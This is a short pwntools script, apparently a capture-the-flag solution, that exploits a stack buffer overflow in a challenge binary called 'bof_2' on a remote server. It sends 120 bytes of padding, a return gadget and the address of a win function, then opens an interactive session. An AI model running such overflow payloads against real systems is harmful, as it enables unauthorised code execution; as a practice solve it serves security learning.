from pwn import *

#p = process('./bof_2')
p = remote('dragonsec.si',40002)

pad = 120 * 'A'
win_addr = p64(0x0000000000400647)
ret = p64(0x00000000004004fe)
payload = pad
payload += ret
payload += win_addr

p.sendlineafter('...\n',payload)
p.recvline()
p.interactive()
